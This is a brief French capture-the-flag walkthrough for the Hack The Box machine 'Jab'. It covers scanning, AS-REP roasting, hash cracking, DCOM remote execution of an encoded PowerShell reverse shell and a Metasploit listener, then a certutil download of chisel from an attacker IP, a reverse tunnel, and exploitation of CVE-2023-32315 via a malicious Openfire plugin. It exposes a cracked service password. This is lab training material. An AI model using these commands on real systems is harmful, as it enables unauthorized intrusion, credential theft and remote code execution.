  # Jab

	echo "10.10.11.4 jab.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.4 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.4 -oN nmap.txt
	
Scans classiques.

    PORT      STATE SERVICE             VERSION
    53/tcp    open  domain?
    88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-03-01 17:30:56Z)
    135/tcp   open  msrpc               Microsoft Windows RPC
    139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
    389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
    3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
    5222/tcp  open  jabber
    5223/tcp  open  ssl/jabber
    5262/tcp  open  jabber
    5263/tcp  open  ssl/jabber
    5269/tcp  open  xmpp                Wildfire XMPP Client
    5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
    5275/tcp  open  jabber
    5276/tcp  open  ssl/jabber
    5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    7070/tcp  open  realserver?
    7443/tcp  open  ssl/oracleas-https?
    7777/tcp  open  socks5              (No authentication; connection failed)
    9389/tcp  open  mc-nmf              .NET Message Framing
    47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    49664/tcp open  msrpc               Microsoft Windows RPC
    49665/tcp open  msrpc               Microsoft Windows RPC
    49666/tcp open  msrpc               Microsoft Windows RPC
    49667/tcp open  msrpc               Microsoft Windows RPC
    49669/tcp open  msrpc               Microsoft Windows RPC
    49670/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
    49671/tcp open  msrpc               Microsoft Windows RPC
    49672/tcp open  msrpc               Microsoft Windows RPC
    49677/tcp open  msrpc               Microsoft Windows RPC
    49769/tcp open  msrpc               Microsoft Windows RPC
    50149/tcp open  msrpc               Microsoft Windows RPC
    50251/tcp open  msrpc               Microsoft Windows RPC
    50288/tcp open  msrpc               Microsoft Windows RPC
    50413/tcp open  msrpc               Microsoft Windows RPC
    50807/tcp open  msrpc               Microsoft Windows RPC
    50827/tcp open  msrpc               Microsoft Windows RPC
    50830/tcp open  msrpc               Microsoft Windows RPC
    50841/tcp open  msrpc               Microsoft Windows RPC


Connexion au XMPP => Dump des utilisateurs => ASREPRoast => Bruteforcing => Connexion avec DCOM : 

    sudo pidgin -d > logs.txt

    GetNPUsers.py jab.htb/ -usersfile users.txt -format hashcat -outputfile hashes.txt
    
    hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
    
    msfconsole -x "use exploit/multi/handler;set LHOST 10.10.16.97;set LPORT 9001;run;"
    
    impacket-dcomexec -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'cmd.exe /c  powershell -e JABj...AA=='  
    


## Élévation de privilèges

Tunneling puis exploitation du CVE-2023–32315 :
    
    ./chisel_linux_1.7.7 server -reverse -p 9999
    ...
    certutil.exe -urlcache -split -f http://10.10.16.97:8080/chisel_1.7.7_windows_amd64.exe chisel.exe
    ./chisel.exe client -v 10.10.16.97:9999 R:9090:127.0.0.1:9090
    
    
Aller sur http://127.0.0.1:9090/ en utilisant les mêmes credentials pour svc_openfire puis utiliser ce .jar : https://github.com/miko550/CVE-2023-32315

Plugins => Upload Plugin

Server => Server Settings => Management Tool => Mettre "123" dans le mot de passe de l'admin (indiqué par l'auteur)
  
Aller dans "File system" puis mettre le chemin "C:\Users\Administrator\Desktop" et lire le flag.


